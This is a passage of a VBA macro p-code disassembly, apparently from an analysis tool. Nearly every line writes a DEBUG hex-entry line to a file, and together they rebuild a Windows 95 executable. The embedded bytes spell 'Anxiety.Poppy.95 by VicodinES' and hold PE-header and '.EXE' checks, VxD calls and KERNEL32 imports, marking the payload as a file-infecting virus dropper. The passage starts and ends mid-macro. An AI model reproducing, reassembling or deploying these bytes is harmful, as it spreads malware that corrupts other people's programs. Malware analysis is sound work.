' 	LitStr 0x0036 "E 0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #243:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #244:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #245:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #246:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #247:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #248:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #249:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #250:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #251:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0700 B8 4E 05 00 00 E9 F8 0F 00 00 6A 00 E8 00 00 00"
' 	PrintItemNL 
' Line #252:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0710 00 FF 25 30 30 40 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #253:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #254:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #255:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #256:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #257:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #258:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #259:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #260:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #261:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #262:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #263:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #264:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #265:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #266:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #267:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #268:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #269:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #270:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #271:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #272:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #273:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #274:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #275:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #276:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #277:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #278:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #279:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #280:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #281:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #282:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #283:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0900 00 00 BD 00 00 00 00 66 2B FF BF 00 10 00 C0 B8"
' 	PrintItemNL 
' Line #284:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0910 FF 00 00 00 B9 FF FF FF FF F2 AE 8B D9 0B C9 0F"
' 	PrintItemNL 
' Line #285:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0920 84 80 00 00 00 81 FF 00 C0 00 C0 73 78 90 90 90"
' 	PrintItemNL 
' Line #286:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0930 90 F3 AE 0B C9 74 6E 90 90 90 90 2B D9 81 FB 4E"
' 	PrintItemNL 
' Line #287:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0940 06 00 00 72 D4 2B FB B8 7F 15 00 C0 8B 18 81 7B"
' 	PrintItemNL 
' Line #288:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0950 0C 56 4D 4D 20 75 4E 90 90 90 90 8B 5B 30 8D 43"
' 	PrintItemNL 
' Line #289:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0960 3C 89 85 C1 20 40 00 8B 00 89 85 D2 20 40 00 8D"
' 	PrintItemNL 
' Line #290:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0970 87 B2 00 00 00 89 43 3C 8D B5 02 20 40 00 B9 4E"
' 	PrintItemNL 
' Line #291:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0980 05 00 00 89 BD B6 20 40 00 81 AD B6 20 40 00 02"
' 	PrintItemNL 
' Line #292:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0990 20 40 00 89 BD 50 21 40 00 81 AD 50 21 40 00 02"
' 	PrintItemNL 
' Line #293:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09A0 20 40 00 F3 A4 8C 8D B2 20 40 00 EB 00 EA 0A 10"
' 	PrintItemNL 
' Line #294:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09B0 40 00 37 01 60 BA 00 00 00 00 8B 82 D2 20 40 00"
' 	PrintItemNL 
' Line #295:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09C0 A3 00 00 00 00 8C 8A D6 20 40 00 E8 08 00 00 00"
' 	PrintItemNL 
' Line #296:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09D0 61 EA 00 00 00 00 28 00 8D 82 46 21 40 00 52 50"
' 	PrintItemNL 
' Line #297:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09E0 CD 20 67 00 40 00 83 C4 04 5A 89 82 DC 24 40 00"
' 	PrintItemNL 
' Line #298:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09F0 52 B8 00 D5 00 00 2B C9 BB 02 00 00 00 BA 12 00"
' 	PrintItemNL 
' Line #299:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A00 00 00 CD 20 32 00 40 00 5A 72 3A 90 90 90 90 CD"
' 	PrintItemNL 
' Line #300:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A10 20 32 00 40 00 B8 00 D7 00 00 CD 20 32 00 40 00"
' 	PrintItemNL 
' Line #301:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A20 5A CD 20 4A 01 01 00 83 C4 0C 5A CD 20 52 01 01"
' 	PrintItemNL 
' Line #302:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A30 00 83 C4 18 5A 8B 82 51 25 40 00 50 CD 20 49 01"
' 	PrintItemNL 
' Line #303:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A40 01 00 83 C4 04 C3 55 8B EC 83 EC 20 53 56 57 BF"
' 	PrintItemNL 
' Line #304:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A50 00 00 00 00 80 BF 50 25 40 00 01 0F 84 62 03 00"
' 	PrintItemNL 
' Line #305:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A60 00 83 7D 0C 24 0F 85 58 03 00 00 C6 87 50 25 40"
' 	PrintItemNL 
' Line #306:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A70 00 01 60 8D B7 A1 25 40 00 8B 45 10 3C FF 74 0D"
' 	PrintItemNL 
' Line #307:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A80 90 90 90 90 04 40 88 06 46 C6 06 3A 46 2B C0 89"
' 	PrintItemNL 
' Line #308:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0A90 87 69 25 40 00 89 87 6D 25 40 00 50 B8 FF 00 00"
' 	PrintItemNL 
' Line #309:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AA0 00 50 8B 5D 1C 8B 43 0C 83 C0 04 50 8B C6 50 CD"
' 	PrintItemNL 
' Line #310:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AB0 20 41 00 40 00 83 C4 10 03 F0 C6 06 00 81 7E FC"
' 	PrintItemNL 
' Line #311:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AC0 2E 45 58 45 0F 85 F1 02 00 00 B8 00 D5 00 00 2B"
' 	PrintItemNL 
' Line #312:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AD0 C9 8D B7 A1 25 40 00 BB 02 00 00 00 BA 01 00 00"
' 	PrintItemNL 
' Line #313:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AE0 00 CD 20 32 00 40 00 0F 82 CE 02 00 00 8B D8 B9"
' 	PrintItemNL 
' Line #314:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0AF0 04 00 00 00 BA 3C 00 00 00 B8 00 D6 00 00 8D B7"
' 	PrintItemNL 
' Line #315:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B00 59 25 40 00 CD 20 32 00 40 00 B9 04 00 00 00 8B"
' 	PrintItemNL 
' Line #316:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B10 97 59 25 40 00 B8 00 D6 00 00 8D B7 A1 25 40 00"
' 	PrintItemNL 
' Line #317:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B20 CD 20 32 00 40 00 81 3E 50 45 00 00 0F 85 7E 02"
' 	PrintItemNL 
' Line #318:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B30 00 00 B9 04 00 00 00 8B 97 59 25 40 00 83 C2 34"
' 	PrintItemNL 
' Line #319:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B40 B8 00 D6 00 00 8D B7 5D 25 40 00 CD 20 32 00 40"
' 	PrintItemNL 
' Line #320:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B50 00 B9 04 00 00 00 8B 97 59 25 40 00 83 C2 28 B8"
' 	PrintItemNL 
' Line #321:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B60 00 D6 00 00 8D B7 AE 20 40 00 CD 20 32 00 40 00"
' 	PrintItemNL 
' Line #322:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B70 8B 87 5D 25 40 00 01 87 AE 20 40 00 B9 04 00 00"
' 	PrintItemNL 
' Line #323:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B80 00 8B 97 59 25 40 00 83 C2 38 8D B7 61 25 40 00"
' 	PrintItemNL 
' Line #324:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0B90 B8 00 D6 00 00 CD 20 32 00 40 00 B9 04 00 00 00"
' 	PrintItemNL 
' Line #325:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BA0 8B 97 59 25 40 00 83 C2 3C 8D B7 65 25 40 00 B8"
' 	PrintItemNL 
' Line #326:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BB0 00 D6 00 00 CD 20 32 00 40 00 B9 02 00 00 00 8B"
' 	PrintItemNL 
' Line #327:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BC0 97 59 25 40 00 83 C2 14 B8 00 D6 00 00 8D B7 69"
' 	PrintItemNL 
' Line #328:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BD0 25 40 00 CD 20 32 00 40 00 B9 02 00 00 00 8B 97"
' 	PrintItemNL 
' Line #329:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BE0 59 25 40 00 83 C2 06 B8 00 D6 00 00 8D B7 6D 25"
' 	PrintItemNL 
' Line #330:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0BF0 40 00 CD 20 32 00 40 00 8B 06 B9 28 00 00 00 F7"
' 	PrintItemNL 
' Line #331:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C00 E1 8B 97 69 25 40 00 03 D0 2B D1 03 97 59 25 40"
' 	PrintItemNL 
' Line #332:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C10 00 83 C2 18 89 97 71 25 40 00 B8 00 D6 00 00 8D"
' 	PrintItemNL 
' Line #333:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C20 B7 79 25 40 00 CD 20 32 00 40 00 80 BF 80 25 40"
' 	PrintItemNL 
' Line #334:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C30 00 FF 0F 84 78 01 00 00 C6 87 80 25 40 00 FF 8B"
' 	PrintItemNL 
' Line #335:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C40 87 81 25 40 00 03 87 85 25 40 00 89 87 55 25 40"
' 	PrintItemNL 
' Line #336:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C50 00 03 87 5D 25 40 00 2D 02 20 40 00 89 87 03 20"
' 	PrintItemNL 
' Line #337:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C60 40 00 2B D2 B8 4E 05 00 00 8B 8F 65 25 40 00 F7"
' 	PrintItemNL 
' Line #338:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C70 F1 40 F7 E1 50 03 87 81 25 40 00 89 87 89 25 40"
' 	PrintItemNL 
' Line #339:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C80 00 2B D2 B8 4E 05 00 00 8B 8F 61 25 40 00 F7 F1"
' 	PrintItemNL 
' Line #340:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0C90 40 F7 E1 50 03 87 81 25 40 00 89 87 81 25 40 00"
' 	PrintItemNL 
' Line #341:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CA0 8B 87 81 25 40 00 03 87 85 25 40 00 89 87 75 25"
' 	PrintItemNL 
' Line #342:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CB0 40 00 C7 87 9D 25 40 00 40 00 00 E0 B9 04 00 00"
' 	PrintItemNL 
' Line #343:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CC0 00 8B 97 59 25 40 00 83 C2 50 B8 01 D6 00 00 8D"
' 	PrintItemNL 
' Line #344:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CD0 B7 75 25 40 00 CD 20 32 00 40 00 B9 28 00 00 00"
' 	PrintItemNL 
' Line #345:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CE0 8B 97 71 25 40 00 B8 01 D6 00 00 8D B7 79 25 40"
' 	PrintItemNL 
' Line #346:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0CF0 00 CD 20 32 00 40 00 66 B9 40 00 C7 87 E0 20 40"
' 	PrintItemNL 
' Line #347:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D00 00 CD 20 67 00 66 89 8F E4 20 40 00 C7 87 AF 21"
' 	PrintItemNL 
' Line #348:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D10 40 00 CD 20 41 00 66 89 8F B3 21 40 00 66 B9 01"
' 	PrintItemNL 
' Line #349:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D20 00 C7 87 21 21 40 00 CD 20 4A 01 66 89 8F 25 21"
' 	PrintItemNL 
' Line #350:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D30 40 00 C7 87 2B 21 40 00 CD 20 52 01 66 89 8F 2F"
' 	PrintItemNL 
' Line #351:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D40 21 40 00 C7 87 3C 21 40 00 CD 20 49 01 66 89 8F"
' 	PrintItemNL 
' Line #352:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D50 40 21 40 00 8D B7 08 25 40 00 B9 12 00 00 00 AD"
' 	PrintItemNL 
' Line #353:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D60 03 C7 C7 00 CD 20 32 00 66 C7 40 04 40 00 E2 EF"
' 	PrintItemNL 
' Line #354:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D70 59 B8 01 D6 00 00 8B 97 81 25 40 00 03 97 8D 25"
' 	PrintItemNL 
' Line #355:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D80 40 00 2B D1 59 8D B7 02 20 40 00 CD 20 32 00 40"
' 	PrintItemNL 
' Line #356:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0D90 00 B9 04 00 00 00 8B 97 59 25 40 00 83 C2 28 B8"
' 	PrintItemNL 
' Line #357:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DA0 01 D6 00 00 8D B7 55 25 40 00 CD 20 32 00 40 00"
' 	PrintItemNL 
' Line #358:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DB0 B8 00 D7 00 00 CD 20 32 00 40 00 61 C6 87 50 25"
' 	PrintItemNL 
' Line #359:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DC0 40 00 00 8B 45 1C 50 8B 45 18 50 8B 45 14 50 8B"
' 	PrintItemNL 
' Line #360:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DD0 45 10 50 8B 45 0C 50 8B 45 08 50 B8 00 00 00 00"
' 	PrintItemNL 
' Line #361:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DE0 FF 10 83 C4 18 5F 5E 5B C9 C3 41 6E 78 69 65 74"
' 	PrintItemNL 
' Line #362:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0DF0 79 2E 50 6F 70 70 79 2E 39 35 20 62 79 20 56 69"
' 	PrintItemNL 
' Line #363:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E00 63 6F 64 69 6E 45 53 00 E1 21 40 00 04 22 40 00"
' 	PrintItemNL 
' Line #364:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E10 20 22 40 00 4B 22 40 00 6A 22 40 00 95 22 40 00"
' 	PrintItemNL 
' Line #365:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E20 B4 22 40 00 D3 22 40 00 F2 22 40 00 25 23 40 00"
' 	PrintItemNL 
' Line #366:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E30 D5 23 40 00 F1 23 40 00 8B 24 40 00 AA 24 40 00"
' 	PrintItemNL 
' Line #367:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E40 B5 24 40 00 02 21 40 00 0F 21 40 00 1A 21 40 00"
' 	PrintItemNL 
' Line #368:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #369:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #370:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #371:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #372:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0E90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #373:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #374:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #375:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #376:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0ED0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #377:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #378:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0EF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #379:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F00 28 30 00 00 00 00 00 00 00 00 00 00 38 30 00 00"
' 	PrintItemNL 
' Line #380:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F10 30 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #381:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F20 00 00 00 00 00 00 00 00 46 30 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #382:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F30 46 30 00 00 00 00 00 00 4B 45 52 4E 45 4C 33 32"
' 	PrintItemNL 
' Line #383:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F40 2E 64 6C 6C 00 00 00 00 45 78 69 74 50 72 6F 63"
' 	PrintItemNL 
' Line #384:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F50 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #385:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0F60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
